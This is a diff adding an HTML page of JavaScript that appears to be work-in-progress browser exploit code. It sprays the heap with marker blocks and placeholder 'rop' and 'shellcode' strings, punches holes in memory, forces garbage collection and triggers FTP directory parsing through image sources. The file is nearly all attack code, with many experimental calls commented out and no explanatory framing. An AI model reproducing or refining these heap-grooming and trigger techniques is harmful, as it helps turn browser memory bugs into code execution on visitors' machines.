@@ -1,0 +1,268 @@
+<html>
+
+<div id="blah"></div>
+<img id="poop"></img>
+<script>
+function get_ftp(size){
+	var text = "ftp://127.0.0.1:21/c:\\"
+	var possible = "POIUYTREWEWQSHGCBALKJCBNLAUJHFIQLAMXCBNZXMCHASJDHqweprouiqweytpouryxcj"
+	for (var i =0; i < size; i++){//add 136 to get block size (256)
+		text += possible.charAt(Math.floor(Math.random() * possible.length));
+	}
+	return text
+}
+
+function jemalloc_spray(blocks, size){
+	var block_size = size /2;
+	//rop
+	var marker = unescape("%ubeef%udead");
+	marker += marker;
+
+	//shellcode
+	var content = unescape("%u6666%u6666");
+
+	while(content.length < (block_size / 2)){
+		content += content;
+	}
+
+	var arr = [];
+	for (i=0; i<blocks; i++){
+		var rnd1 = Math.floor(Math.random()*1000) % 16;
+		var rnd2 = Math.floor(Math.random()*1000) % 16;
+		var rnd3 = Math.floor(Math.random()*1000) % 16;
+		var rnd4 = Math.floor(Math.random()*1000) % 16;
+
+		var rndstr = "%u" + rnd1.toString() + rnd2.toString();
+		rndstr += "%u" + rnd3.toString() + rnd4.toString();
+
+		var padding = unescape(rndstr);
+
+		while(padding.length < block_size - marker.length - content.length){
+			padding += padding;
+		}
+		var block = marker + content + padding;
+
+		while(block.length < block_size){
+			block += block;
+		}
+		//spray block
+		arr[i] = block.substr(0);
+	}
+
+	Math.asin(1);
+	marker = unescape("%ubabe%ucafe");
+	marker += marker;
+
+	content = unescape("%u7777%u7777");
+
+	while(content.length < (block_size /2)){
+		content += content;
+	}
+
+	//delete every other block
+	for (i=5002; i<blocks; i+=2){
+		delete(arr[i]);
+		arr[i] = null; 
+	}
+
+	var ret = trigger_gc();
+
+	//triggers parsing of ftp directory	
+	arr[5000] = new Image();
+	arr[5000].addEventListener("ON_TEST", function(){
+		document.write("<p>bbbbbbbbbbbbbbbbbbbbbbb</p>");
+	}, false);
+	arr[5000].src = text;
+
+	//allocate the holes with something else
+	for (i=5002; i<blocks; i+=2){
+		var rnd1 = Math.floor(Math.random()*1000) % 16;
+		var rnd2 = Math.floor(Math.random()*1000) % 16;
+		var rnd3 = Math.floor(Math.random()*1000) % 16;
+		var rnd4 = Math.floor(Math.random()*1000) % 16;
+
+		var rndstr = "%u" + rnd1.toString() + rnd2.toString();
+		rndstr += "%u" + rnd3.toString() + rnd4.toString();
+
+		var padding = unescape(rndstr);
+
+		while(padding.length < block_size - marker.length - content.length){
+			padding += padding;
+		}
+		var block = marker + content + padding;
+
+		while(block.length < block_size){
+			block += block;
+		}
+		//spray block
+		arr[i] = block.substr(0);
+	}
+
+	Math.atan2(6,6);
+
+	return arr;
+}
+
+function trigger_gc(){
+	//force garbage collection
+	var gc = [];
+	for (i=0; i<100000; i++){
+		gc[i] = new Array();
+	}
+	return gc;
+}
+
+function run_spray(){
+	var poopers = jemalloc_spray(256, 10000);
+	return poopers;
+}
+
+//poop = run_spray();
+//var myWorker = new Worker("worker_test.js")
+//trigger_gc();
+
+function doc_write_spray(){
+	var content = unescape("%u6666%u6666");
+	while (content.length < 88){
+		content += unescape("%u6666%u6666");
+	}
+	i=10000;
+	while(i < 20000){
+		document.write('<p id=\"'+ i +'\">' + i.toString() + content +'</p>');
+		i+=1;
+	}
+}
+
+function button_spray(){
+	var div_container = document.getElementById("blah");
+	div_container.style.cssText = "display:none";
+	var data;
+	offset = 0x104;
+	junk = unescape("%u2020%u2020");
+	while(junk.length < 0x1000) junk += junk;
+
+	rop = unescape("%u4141%u4141%u4141%u4141%u4141%u4141%u4141%u4141");
+	shellcode = unescape("%u4242%u4242%u4242%u4242%u4242%u4242%u4242%u4242");
+	data = junk.substring(0, offset) + rop + shellcode;
+	data += junk.substring(0, 0x800-offset-rop.length-shellcode.length);
+
+	while (data.length < 0x10000) data += data;
+	for (var i = 0; i<0x10000;i++){
+		if (i == 0x8000){
+			var obj = new Image();
+			div_container.appendChild(obj);
+			obj.src = get_ftp();
+		}
+		var obj = document.createElement("button");
+		obj.title = data.substring(0, 0x10000-0x58);
+		div_container.appendChild(obj);
+	}
+	return div_container;
+}
+
+function canvas_spray(times, x, y, val){
+	var memory = new Array();
+	for (i=0; i<times; i++){
+		if(i < times-0x1000){
+			memory[i] = new Image();
+			memory[i].alt = unescape("%u4141%u4141");
+		}
+		else{
+			memory[i] = new Uint8ClampedArray(x * y);
+			for (j=0; j< x * y; j++){
+				memory[i][j] = val;
+			}
+		}
+	}
+//	delete(memory[times-1]);
+	memory[times-0x1001].src = get_ftp();
+	for (i=0; i<times-0x1000; i++){
+		if (memory[i].alt != unescape("%u4141%u4141")){
+			alert(memory[i]);
+		}
+	}
+	
+//	for (i=times; i<(times*2); i++){
+//		memory[i] = new Uint8ClampedArray(1024 * 1024);
+//		for (j=0; j< 1024 * 1024; j++){
+//			memory[i][j] = 0x44;
+//		}
+//	}
+//	memory[times-1].src = get_ftp();
+	return memory;
+}
+function canvas_spray2(memory, times, x, y, val){
+	for (i=0; i<times; i++){
+		memory[i] = new Uint8ClampedArray(x * y);
+		for (j=0; j< x * y; j++){
+			memory[i][j] = val;
+		}
+	}
+	return memory;
+}
+
+//arr = new Array();
+//arr[0] = canvas_spray(0x1000, 64, 64, 0x41);
+//arr[1] = canvas_spray(0x1000, 128, 128, 0x42);
+//asdf = canvas_spray(0x100000, 24, 53, 0x41);
+
+var spr = new Array();
+var memory = new Array();
+ctr = 0
+for (i=0; i<1000; i++){
+	var z = i;
+	spr[i] = canvas_spray2(memory, 0x100, 10+z, 10+z, 0x40+z);
+	ctr += 1;
+	i = ctr;
+	}
+//arr2 = canvas_spray(0x100, 16, 47, 0x44);
+spr[800][256].src = get_ftp();
+
+
+//spr[0x200].src = get_ftp();
+//arr[3] = canvas_spray(0x1000, 16, 16, 0x44);
+//arr[4] = canvas_spray(0x1000, 32, 32, 0x45);
+//delete(arr[0x80]);
+//arr[0x80] = null;
+//arr3 = canvas_spray(0x100, 16, 8, 0x45);
+//img.src = get_ftp();
+//alert(arr2[0] + arr3[0]);
+//div = button_spray();
+//document.write("<iframe src="+get_ftp()+" height='500' width='500'></iframe>");
+//alert(arr.length);
+//var obj = document.getElementById("poop");
+//obj.src = get_ftp();
+//elem = document.getElementById("10100");
+/*
+elem = document.getElementById("10330");
+elem.parentNode.removeChild(elem);
+elem = document.getElementById("10331");
+elem.parentNode.removeChild(elem);
+elem = document.getElementById("10332");
+elem.parentNode.removeChild(elem);
+elem = document.getElementById("10333");
+elem.parentNode.removeChild(elem);
+elem = document.getElementById("10334");
+elem.parentNode.removeChild(elem);
+elem = document.getElementById("10335");
+elem.parentNode.removeChild(elem);
+elem = document.getElementById("10336");
+trigger_gc();
+elem = document.getElementById("10337");
+elem.appendChild(new Image().src = text);
+elem = document.getElementById("10338");
+elem.appendChild(new Image().src = text);
+elem = document.getElementById("10339");
+elem.appendChild(new Image().src = text);
+elem = document.getElementById("10340");
+elem.appendChild(new Image().src = text);
+elem = document.getElementById("10341");
+elem.appendChild(new Image().src = text);
+elem = document.getElementById("10339");
+*/
+</script>
+<body>
+
+</body>
+
+</html>
